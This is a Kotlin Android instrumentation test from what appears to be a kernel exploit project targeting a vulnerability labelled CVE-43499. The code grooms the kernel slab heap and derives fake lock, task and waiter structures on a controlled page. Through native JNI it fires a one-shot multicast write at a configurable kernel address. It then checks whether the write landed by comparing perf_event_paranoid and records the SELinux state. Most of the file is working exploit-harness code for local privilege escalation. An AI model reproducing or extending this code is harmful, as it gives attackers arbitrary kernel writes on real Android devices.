package com.ghostlock.app.backend.cve43499.victim

import androidx.test.ext.junit.runners.AndroidJUnit4
import androidx.test.platform.app.InstrumentationRegistry
import com.ghostlock.app.backend.cve43499.flow.Cve43499PageProbeStep
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteChainPolicy
import com.ghostlock.app.backend.cve43499.flow.Cve43499WriteTransactionRunner
import com.ghostlock.app.backend.cve43499.generator.Cve43499RouteGeneratorFactory
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteMode
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteRequest
import com.ghostlock.app.backend.cve43499.generator.Cve43499WriteGenerator
import com.ghostlock.app.backend.cve43499.lifecycle.Cve43499Lifecycle
import com.ghostlock.app.backend.cve43499.owned.PlacementConfig
import com.ghostlock.app.data.cve43499.A301SoDebugConfig
import com.ghostlock.app.jni.Native43499ActorSetup
import com.ghostlock.app.jni.Native43499Jni
import com.ghostlock.app.jni.Native43499MulticastSpec
import java.io.File
import java.io.FileOutputStream
import org.junit.Assert.assertTrue
import org.junit.Assume
import org.junit.Test
import org.junit.runner.RunWith

/**
 * A1 单发 multicast probe（debug-only；default SKIP，Lead opt-in 后运行）。
 *
 * 依据：`very_legacy/temp_mcast_510.c:105-130`（one-shot）+
 * `very_legacy/fops.c:136-150` stamp 布局 + `very_legacy/main.c:406-442` consumer。
 *
 * 只做：placement+landing（page-prep-only，不 prepareActor/executeActor）→
 * page 派生 fakeLock/fakeTask/fakeW0 → native 单发 1 条 MCAST_BLOCK_SOURCE
 * （target=0x1000 非安全目标）→ consumer 有界驱动 → 结果落盘。
 * 不 spawn victim、不写 flags/mode、不改 SELinux；panic 由 Lead 记录后重启。
 */
@RunWith(AndroidJUnit4::class)
class Mcast510ProbeTest {
    @Test
    fun mcast510SingleShotProbe() {
        val instrumentation = InstrumentationRegistry.getInstrumentation()
        val args = InstrumentationRegistry.getArguments()
        Assume.assumeTrue(
            "A1 未 opt-in：需 -e mcast510 true -e mcast510_ack MCAST510_ACK",
            args.getString("mcast510") == "true" &&
                args.getString("mcast510_ack") == "MCAST510_ACK",
        )
        val context = instrumentation.targetContext
        val targetArg = args.getString("mcast510_target") ?: DEFAULT_TARGET_ARG
        val preserveChild = when (
            val raw = args.getString("mcast510_preserve_child")?.lowercase() ?: "false"
        ) {
            "true" -> true
            "false" -> false
            else -> error("mcast510_preserve_child 非法: $raw")
        }
        val piWaiter = when (
            val raw = args.getString("mcast510_pi_waiter")?.lowercase() ?: "false"
        ) {
            "true" -> true
            "false" -> false
            else -> error("mcast510_pi_waiter 非法: $raw")
        }
        val owner = parseBoolArg(args.getString("mcast510_owner"), "mcast510_owner")
        val requeue = parseBoolArg(args.getString("mcast510_requeue"), "mcast510_requeue")
        val pageBaseMode = when (val raw = args.getString("mcast510_page_base")?.lowercase() ?: "actual") {
            "actual", "candidate" -> raw
            else -> error("mcast510_page_base 非法: $raw")
        }
        val report = File(context.filesDir, REPORT_FILE)
        val lines = mutableListOf<String>()
        val startedNs = System.nanoTime()
        var lifecycle: Cve43499Lifecycle? = null
        try {
            lines += "GLK-MCAST510|begin|kernel=${System.getProperty("os.version")}" +
                "|uid=${android.os.Process.myUid()}|target_arg=$targetArg" +
                "|preserve_child=$preserveChild|pi_waiter=$piWaiter" +
                "|owner=$owner|requeue=$requeue|page_base_mode=$pageBaseMode"
            val debug = A301SoDebugConfig.load(context)
            val execution = A301SoDebugConfig.executionParameters(debug)
            val ghostPid = android.os.Process.myPid()
            val generator = Cve43499RouteGeneratorFactory.create(debug, execution, ghostPid)
                as? Cve43499WriteGenerator
                ?: error("generator 非 WriteGenerator: ${debug.injection.primitive}")
            val planner = Cve43499RouteGeneratorFactory.createPlanner(debug, execution, ghostPid)
            val policy = Cve43499WriteChainPolicy.fromDebug(
                A301SoDebugConfig.writeChainParameters(),
                debug.injection.primitive,
            )
            val placement = PlacementConfig(
                placementCpu = execution.placementCpu,
                measurementCpu = execution.measurementCpu,
                timeoutNanos = execution.timeoutNanos,
                pageSize = execution.pageSize,
                allocationSize = execution.allocationSize,
                slabOrder = execution.slabOrder,
                mmStructSize = execution.mmStructSize,
                mmPartials = execution.mmPartials,
                prepareSlabs = execution.prepareSlabs,
                snitchCollisions = debug.kernelsnitch.collisions.toLong(),
                pollUs = execution.pollUs,
                requiredAlignment = execution.requiredAlignment,
                scanLowerBound = execution.scanLowerBound,
                scanUpperBound = execution.scanUpperBound,
                scanStep = execution.scanStep,
                scanRoundLimit = execution.scanRoundLimit,
                objectsPerSlab = (execution.allocationSize / execution.mmStructSize).toInt(),
                prepareObjectCount = (execution.allocationSize / execution.mmStructSize).toInt() *
                    execution.prepareSlabs.toInt(),
                sprayObjectCount = (execution.allocationSize / execution.mmStructSize).toInt() *
                    (1 + execution.mmPartials.toInt()),
                preObjectCount = (execution.allocationSize / execution.mmStructSize).toInt() - 1,
                postObjectCount = (execution.allocationSize / execution.mmStructSize).toInt(),
                identityStart = execution.identityStart,
                identityEnd = execution.identityEnd,
                leakTagNibble = execution.leakTagNibble,
                leakTagShift = execution.leakTagShift,
                stagingCapacity = execution.stagingCapacity,
                maxContextEntries = execution.maxContextEntries,
                maxObjectsPerSlab = execution.maxObjectsPerSlab,
                maxMeasurementRounds = execution.maxMeasurementRounds,
            )
            val actorSetup = Native43499ActorSetup(
                ownerCpu = execution.ownerCpu,
                waiterCpu = execution.waiterCpu,
                consumerCpu = execution.consumerCpu,
                ownerPriority = execution.ownerPriority,
                waiterPriority = execution.waiterPriority,
                consumerPriority = execution.consumerPriority,
                threadCount = execution.threadCount,
                prepareTimeoutNanos = execution.prepareTimeoutNanos,
                parkedTimeoutNanos = execution.parkedTimeoutNanos,
                executionTimeoutNanos = execution.executionTimeoutNanos,
                shutdownTimeoutNanos = execution.shutdownTimeoutNanos,
                consumerMax = execution.consumerMax,
                consumerBurst = execution.consumerBurst,
                lockPiSpinNs = execution.lockPiSpinNs,
                pollUs = execution.pollUs,
                setupSettleUs = execution.setupSettleUs,
                requeueExpected = execution.requeueExpected,
                disarmSpinLimit = execution.disarmSpinLimit,
            )
            val localLifecycle = Cve43499Lifecycle()
            lifecycle = localLifecycle
            val runner = Cve43499WriteTransactionRunner(
                lifecycle = localLifecycle,
                writeGenerator = generator,
                placement = placement,
                actorSetup = actorSetup,
                policy = policy,
            )
            /* probe 同形：target 可配（默认 0x1000；page+offset 依赖本次 page_base）；
             * mode=zero、preserve_child=0（legacy temp_mcast）。 */
            val prepared = runner.preparePageOnly { pageBase ->
                Cve43499WriteRequest(
                    target = parseTarget(targetArg, pageBase),
                    mode = Cve43499WriteMode.ZERO,
                    preserveChild = preserveChild,
                )
            }
            if (prepared is Cve43499PageProbeStep.Failed) {
                lines += "GLK-MCAST510|prepare=FAIL|reason=${prepared.reason}"
                writeReport(report, lines)
                assertTrue("mcast510 prepare failed: ${prepared.reason}", false)
                return
            }
            val page = prepared as Cve43499PageProbeStep.Prepared
            val spec = page.primitive as Native43499MulticastSpec
            val candidateBase = page.facts.candidatePageBase
            val actualBase = if (page.actualPageBase != 0L) page.actualPageBase else candidateBase
            val baseDelta = actualBase - candidateBase
            val pageMismatch = actualBase != candidateBase
            /* task-123：默认用 actual landing 页基址派生 fake 地址；candidate 模式保留对照。 */
            val payloadGeometry = debug.generator.payload
            val payloadBase = actualBase + payloadGeometry.skbDataDelta
            val actualFakeLock = payloadBase + payloadGeometry.lockOff
            val actualFakeTask = payloadBase + payloadGeometry.fakeTaskOff
            val actualFakeW0 = payloadBase + payloadGeometry.w0Off
            val fakeLock = if (pageBaseMode == "actual") actualFakeLock else spec.finalLockAddress
            val fakeTask = if (pageBaseMode == "actual") actualFakeTask else spec.finalTaskAddress
            val fakeW0 = if (pageBaseMode == "actual") actualFakeW0 else spec.finalWaiterAddress
            val target = parseTarget(targetArg, candidateBase)
            lines += "GLK-MCAST510|page|page_base_mode=$pageBaseMode" +
                "|candidate_base=0x${hex64(candidateBase)}" +
                "|actual_base=0x${hex64(actualBase)}" +
                "|base_delta=$baseDelta|page_base_mismatch=$pageMismatch" +
                "|fakeLock=0x${hex64(fakeLock)}|fakeTask=0x${hex64(fakeTask)}" +
                "|fakeW0=0x${hex64(fakeW0)}" +
                "|geometry=waiter96/task48/lock56/buffer264/compact1" +
                "|preserve_child=$preserveChild"
            val paranoidBefore = readParanoid()
            val enforceBefore = getEnforce()
            /* native one-shot + consumer（pi_waiter=true 时含 legacy waiter/chain）；
             * 返回后写盘（PI 窗口内无 IO/日志）。 */
            val result = Native43499Jni.mcast510Probe(
                fakeLock = fakeLock,
                fakeTask = fakeTask,
                fakeW0 = fakeW0,
                pageBase = actualBase,
                target = target,
                timeoutMs = 1_000L,
                consumerCpu = execution.consumerCpu,
                piWaiter = piWaiter,
                waiterCpu = execution.waiterCpu,
                owner = owner,
                requeue = requeue,
                settleMs = 50,
            )
            val ret = result.getOrNull(0) ?: -1L
            val errno = result.getOrNull(1) ?: -1L
            val calls = result.getOrNull(2) ?: -1L
            val success = result.getOrNull(3) ?: -1L
            val elapsedNs = result.getOrNull(4) ?: -1L
            val waiterWaitRet = result.getOrNull(12) ?: Int.MIN_VALUE.toLong()
            val waiterWaitErrno = result.getOrNull(13) ?: -1L
            val waiterTid = result.getOrNull(14) ?: -1L
            val ownerLockRet = result.getOrNull(16) ?: Int.MIN_VALUE.toLong()
            val ownerLockErrno = result.getOrNull(17) ?: -1L
            val ownerChainRet = result.getOrNull(18) ?: Int.MIN_VALUE.toLong()
            val ownerChainErrno = result.getOrNull(19) ?: -1L
            val requeueRet = result.getOrNull(20) ?: Int.MIN_VALUE.toLong()
            val requeueErrno = result.getOrNull(21) ?: -1L
            val ownerStarted = result.getOrNull(22) ?: -1L
            val enforceAfter = getEnforce()
            val paranoidAfter = readParanoid()
            val writeLanded = paranoidBefore.trim() != paranoidAfter.trim()
            val pass = ret == 0L || success > 0L
            val elapsedMs = (System.nanoTime() - startedNs) / 1_000_000L
            lines += "GLK-MCAST510|result|pass=$pass|ret=$ret|errno=$errno" +
                "|calls=$calls|success=$success|elapsed_ns=$elapsedNs" +
                "|total_ms=$elapsedMs|target=0x${hex64(target)}" +
                "|page_base=0x${hex64(actualBase)}" +
                "|candidate_base=0x${hex64(candidateBase)}" +
                "|page_base_mode=$pageBaseMode|page_base_mismatch=$pageMismatch" +
                "|fake_lock=0x${hex64(fakeLock)}" +
                "|fake_task=0x${hex64(fakeTask)}" +
                "|fake_w0=0x${hex64(fakeW0)}" +
                "|preserve_child=$preserveChild|pi_waiter=$piWaiter" +
                "|waiter_wait_ret=$waiterWaitRet|waiter_wait_errno=$waiterWaitErrno" +
                "|waiter_tid=$waiterTid|enforce_before=$enforceBefore|enforce_after=$enforceAfter" +
                "|owner_lock_ret=$ownerLockRet|owner_lock_errno=$ownerLockErrno" +
                "|owner_chain_ret=$ownerChainRet|owner_chain_errno=$ownerChainErrno" +
                "|requeue_ret=$requeueRet|requeue_errno=$requeueErrno" +
                "|owner_started=$ownerStarted" +
                "|paranoid_before=$paranoidBefore|paranoid_after=$paranoidAfter" +
                "|write_landed=$writeLanded"
            writeReport(report, lines)
            assertTrue("mcast510 result=${lines.joinToString("|")}", pass)
        } finally {
            runCatching { lifecycle?.closeChain() }
            writeReport(report, lines)
        }
    }

    /** @param report filesDir 报告；append+flush+fsync（legacy 证据要求）。 */
    private fun writeReport(report: File, lines: List<String>) {
        FileOutputStream(report, false).use { stream ->
            val bytes = (lines.joinToString("\n") + "\n").toByteArray(Charsets.UTF_8)
            stream.write(bytes)
            stream.flush()
            stream.fd.sync()
        }
        lines.forEach { android.util.Log.i(LOG_TAG, it) }
    }

    private fun LongArray.getOrNull(index: Int): Long? =
        if (index in indices) this[index] else null

    /**
     * 解析 `mcast510_target`：
     * - 缺省 `0x1000`；
     * - `page+<offset>`：offset 裸数字按十进制、`0x` 前缀按十六进制；
     * - `0x...` 绝对地址（unsigned 64-bit，允许 > Long.MAX_VALUE）。
     */
    private fun parseTarget(raw: String, pageBase: Long): Long {
        val value = raw.trim()
        require(value.isNotEmpty()) { "mcast510_target 为空" }
        if (value.startsWith("page+", ignoreCase = true)) {
            val offsetText = value.substring(5)
            val offset = if (offsetText.startsWith("0x", ignoreCase = true)) {
                java.lang.Long.parseUnsignedLong(offsetText.substring(2), 16)
            } else {
                offsetText.toLongOrNull()
                    ?: error("mcast510_target page offset 非法: $raw")
            }
            return pageBase + offset
        }
        if (value.startsWith("0x", ignoreCase = true)) {
            return java.lang.Long.parseUnsignedLong(value.substring(2), 16)
        }
        return value.toLongOrNull() ?: error("mcast510_target 非法: $raw")
    }

    /** @return `/proc/sys/kernel/perf_event_paranoid`（app 可读；unreadable 时如实记录）。 */
    private fun readParanoid(): String = runCatching {
        File("/proc/sys/kernel/perf_event_paranoid").readText().trim()
    }.getOrDefault("unreadable")

    private fun parseBoolArg(raw: String?, name: String): Boolean = when (raw?.lowercase() ?: "false") {
        "true" -> true
        "false" -> false
        else -> error("$name 非法: $raw")
    }

    private fun hex64(value: Long): String = java.lang.Long.toUnsignedString(value, 16)

    /** @return 当前 SELinux enforce 证据（API 优先；app 域不可读时标 unreadable）。 */
    private fun getEnforce(): String = runCatching {
        val type = Class.forName("android.os.SELinux")
        val enforced = type.getMethod("isSELinuxEnforced").invoke(null) as? Boolean
        when (enforced) {
            true -> "enforcing"
            false -> "permissive/api-false"
            null -> "unknown"
        }
    }.getOrElse {
        runCatching {
            "file=" + File("/sys/fs/selinux/enforce").readText().trim()
        }.getOrDefault("unreadable")
    }

    private companion object {
        const val LOG_TAG = "GLK-MCAST510"
        const val REPORT_FILE = "mcast510-probe.txt"
        const val DEFAULT_TARGET_ARG = "0x1000"
    }
}
